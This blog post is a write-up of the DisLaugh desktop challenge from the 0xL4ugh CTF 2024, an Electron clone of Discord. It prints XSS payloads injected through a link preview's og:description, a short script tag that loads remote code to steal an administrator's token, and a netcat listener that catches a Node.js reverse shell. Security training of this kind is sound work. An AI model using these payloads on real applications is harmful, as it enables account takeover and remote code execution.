---
layout: post
title: DisLaugh | 0xL4ugh CTF 2024
tags: [Desktop,XSS,RCE]
published: true
---
# Introduction
In this blog post, I'll share how I solved the DisLaugh Desktop Challenge from 0xL4ugh CTF 2024 in an unintended way, along with my team, [thehackerscrew](https://ctftime.org/team/85618/). <br>
I 🩸 it and another three solves only so far. <br>
![Chall CTFd](/assets/img/dislaugh/challenge.png)
<br>

## Exploring
We start by visiting the link provided in the challenge description, it looks like it's a carbon copy of [Discord](https://discord.com)

![Home Page](/assets/img/dislaugh/home-page.png)<br>
We'll download the [Windows Client](https://drive.google.com/file/d/1sKXkr0G7PhmJhWQGirRYdMcAUGOjP0QN/view?usp=sharing) and then Install it. <br>

![Installing the Application](/assets/img/dislaugh/Installing.png)
After the installation, it will pop out a discord-similar login screen<br>

![Login Screen](/assets/img/dislaugh/login-screen.png)
We'll register a new account first<br>

![Register Screen](/assets/img/dislaugh/register-screen.png)

After registration, it'll redirect us to the Login Screen again.<br>
After logging, we'll see the Home Screen.

![Home Screen](/assets/img/dislaugh/home-screen.png)

We have only one option to do, this plus sign is used in Discord to create/join a server.

![Join/Create Server](/assets/img/dislaugh/create-join-server.png)

After we create the server it will appear in the left bar, we can click on it to see what's in there

![Server Screen](/assets/img/dislaugh/server-screen.png)

We can only Send Messages and Copy The Invite code 

![Server Screen](/assets/img/dislaugh/invite-code.png)

## JS Code Review

Right-click on the DisLaugh shortcut it will show us the installation location.<br>
It will be found at `C:\Users\{USERNAME}\AppData\Local\Programs\dislaugh`

![Install Location](/assets/img/dislaugh/install-location.png)

We see here it's probably the application written in ElectronJS, so we can get the source code from resources/app.asar <br>

> app.asar is an ASAR archive that contains the source code for the application.<br>

We'll use [asar](https://github.com/electron/asar) utility to extract the contents of the app.asar

![Asar Contents](/assets/img/dislaugh/unpacking_app_asar.png)

We'll use any online js beautifier to make the js code more comfortable

We'll skip the boring parts in app.js but we'll keep only in mind

 ```js
 webPreferences: {
            nodeIntegration: !0,
            contextIsolation: !1,
            enableRemoteModule: !0,
            preload: path.join(__dirname, "preload_dash.js")
                }        
```
In `/templates/assets/js` we have <br>
alert.js: Responsible for Push Notifications <br>
auth.js: Responsible for handling login/register stuff<br>
dash-events.js: Responsible for listening for all events in the dashboard and routing them to the right function<br>
dashboard.js: Contains all functions <br>
jquery-3.7.1.min.js & socket.io.min.js <br>

We're interested in the juicy file that contains many functions ( `dashboard.js` ), I checked many functions but it seems fine for me, Suddenly this function caught my attention

```js
    addLink = (e, a, t, r, s = !1) => {
        var n = $('<div class="msg-container"></div>'),
            i = $('<div class="msg-author-icon"></div>');
        i.text(getUserIcon(r)), n.append(i);
        var o = $('<div class="msg-body"></div>'),
            d = $('<div class="msg-author-name"></div>');
        d.text(r);
        var v = $('<a href="" class="msg-link"></a>');
        v.text(e), v.attr("href", "#"), o.append(d), o.append(v);
        var c = $('<div class="msg-link-metadata"></div>'),
            p = $('<a href="" class="msg-link-title"></a>');
        p.text(a), p.attr("href", "#");
        var l = $('<div class="msg-link-desc"></div>');
        if (l.append(t), c.append(p), c.append(l), s) {
            var m = $('<img src="" class="msg-link-img">');
            m.attr("src", s), c.append(m)
        }
        o.append(c), n.append(o), $(".chat-container").append(n)
    },

```
## Spot the bug
Especially 
`if (l.append(t), c.append(p), c.append(l), s) {`
<br>
It uses jQuery.append() for user-supplied input which is vulnerable to XSS
<br> Back for dash-events.js to see this function event listener

```js
    .on("message", n => {
        console.log("Message received:", n), "text" == n.type ? addMessage(n.msg, n.author) : addLink(n.link, n.title, n.description, n.author, n.img), ScrollToEnd()
    }), socket.on("error", n => {
        pushErrorNotify("DisLaugh", n)
    })

```

We'll see it listens when the WebSocket sends the event `message` it uses [ternary operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Conditional_operator) 
to check the type of the message<br>
If the type is text it'll call addMessage with two parameters otherwise it'll call addLink with five parameters <br>
We'll try to send two messages

![Test Messages](/assets/img/dislaugh/test_messages.png)

Let's take a look at the API directly

![Test Messages but from API](/assets/img/dislaugh/messages-api.png)

We'll use `dirsearch` for trying to fuzz GET/POST endpoints to send message as a link

![Dirsearch](/assets/img/dislaugh/dirsearch.png)

It uses `POST /messages` to send messages, we'll try to fuzz the parameters using `arjun` with the Authorization header containing my token

![arjun](/assets/img/dislaugh/arjun.png)

It didn't give us the known parameters like `sid` or `message`, We'll try to see the response

![Test cURL request](/assets/img/dislaugh/curl-req.png)

Invalid Server ID or message?? Let's try to add `sid` & `message` parameters and run the fuzz again.

![Test arjun](/assets/img/dislaugh/arjunwithsid.png)

`arjun` still found nothing more than we know, We can't find more help us control the type or anything, so the server fetches the content and decides internally it's text or link.
<br>

We need to know where is `t` in `l.append(t)` coming from, it's the third parameter in the function declaration in `dashboard.js` and function calling in `dash-events.js` <br>
So the vulnerable input is the `description`, so we can control the description on our website from the `og:description` tag <br>
We'll try a simple function to test the XSS
```html
<html>
        <head>
            <meta property="og:title" content="Controlled Website">
            <meta property="og:author" content="omakmoh">
            <meta property="og:url" content="https://omakmoh.me/">
            <meta property="og:image" content="logo.png">
            <meta property="og:description" content="<script>alert(1)</script>">
        </head>
        <body></body>
</html>
```
Host the HTML file and send it to the channel

![Alert Test](/assets/img/dislaugh/alert-test.png)

BoOoOoM XSS xD 

Back to the website, we'll see a tab called Help ![Help Page](/assets/img/dislaugh/help-page.png)

It looks like after we entered the invite code and an administrator visited our server, Maybe the flag was in a private server? Let's try to steal the administrator token<br>

We'll use `sendMessage` from `dashboard.js`

```js
sendMessage = async (e, a) => {
        var t = await fetch(BASE_URL + "/messages", {
                method: "POST",
                headers: {
                    authorization: token,
                    "content-type": "application/json"
                },
                body: JSON.stringify({
                    sid: e,
                    message: a
                })
            }),
            r = await t.json();
        return 201 == t.status
    }
```
The function takes two parameters <br>
e = The server to which you want to send a message <br>
a = The message


It will be `sendMessage(activeServer,token)` <br>
both variables are declared in `dashboard.js` 

We'll replace `alert(1)` with `sendMessage(activeServer,token)` and send it again in the channel

![sendMessage Function](/assets/img/dislaugh/test-sendmessage.png)

The payload is cropped? It looks like there's a limit for the description, if we count the characters it'll be 30 characters and the rest is removed and replaced by `...` <br>

## Unintended Solution

Quick search I came across this [blog by TrustedSec](https://trustedsec.com/blog/cross-site-smallish-scripting-xsss) and found a short payload <br> `<script src=http:omakmoh.me/x>` that is match our 30 character limit,
We'll replace it and create an `x` file with the `sendMessage` on our web server <br>
Create a new server ( We do not want to disturb the administrator due to alerts ) and send the link.
Take the invite code and submit it to the help page.

![Admin Token](/assets/img/dislaugh/admin-cookie.png)

We now have the administrator token, let's try to replace our token with the administrator token in localStorage ( CTRL + SHIFT + I ) and refresh the application ( CTRL + R ) <br>

![Disappointment](/assets/img/dislaugh/disappointment.png) We found nothing, We created this server to check if we are in the right account.

Oh wait, do we remember `nodeIntegration` in app.js ?
the value was `!0` that's means true, So if we have XSS we can get RCE <br>

 > `nodeIntergration` means Integrate Node.js features to be accessible directly from your page scripts <br>

We'll use ready-to-go reverse shell from [revshells.com](https://www.revshells.com/node.js%20%232?ip=omakmoh.me&port=1337&shell=cmd&encoding=cmd) Copy the nodejs code and place it `x` file

We'll send the link again in the channel, then we have to listen for incoming connections on port 1337 using `nc -nlvp 1337` <br>

Now for the final step, we have to invite the administrator again.

![flag](/assets/img/dislaugh/flag.png)

We finally got the reverse shell and flag. <br>



Kudos to [DarkT](https://www.linkedin.com/in/darkt/) for writing such a great challenge!

<br>Follow me on [X ( previously Twitter )](https://twitter.com/omakmoh)
